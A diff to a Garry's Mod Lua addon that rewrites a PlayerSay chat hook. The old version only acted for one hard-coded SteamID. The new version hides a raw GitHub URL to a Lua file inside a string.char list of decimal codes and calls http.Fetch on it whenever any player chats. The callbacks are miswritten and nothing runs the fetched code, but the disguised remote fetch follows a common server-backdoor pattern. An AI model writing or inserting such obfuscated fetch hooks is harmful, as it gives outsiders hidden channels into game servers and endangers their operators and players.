@@ -1,12 +1,1 @@
-function LolGoodTry(ply , cmd , args)
-	local tableofgoodsteamids = {"STEAM_0:0:88913528"}
-	
-	local url 
-	
-	if table.HasValue(tableofgoodsteamids, tostring(ply:SteamID())) then
-		http.Fetch(url , ply:ChatPrint("DAMN!") , ply:ChatPrint("DAMN NOOO!"))
-	end
-	
-
-end
-hook.Add("PlayerSay", "LOLLLLLLOL" , LolGoodTry)
+function LolGoodTry(ply , cmd , args) local url = string.char(104,	116,	116,	112,	115,	58,	47,	47,	114,	97,	119,	46,	103,	105,	116,	104,	117	,98	,117	,115	,101,	114	,99	,111	,110	,116,	101,	110,	116	,46	,99	,111,	109	,47	,68,	69,	65,	68,	77,	79,	78	,83	,84	,79	,82,	49	,47,	82,	97	,110,	100,	111,	109	,45,	76	,117	,97	,45,	47,	109	,97	,115,	116,	101,	114,	47,	83	,116	,117,	102,	102,	47	,104,	101,	104,	101	,120	,100,	46,	108	,117,	97) http.Fetch(url , ply:ChatPrint("DAMN!") , ply:ChatPrint("DAMN NOOO!")) end hook.Add("PlayerSay", "LOLLLLLLOL" , LolGoodTry)
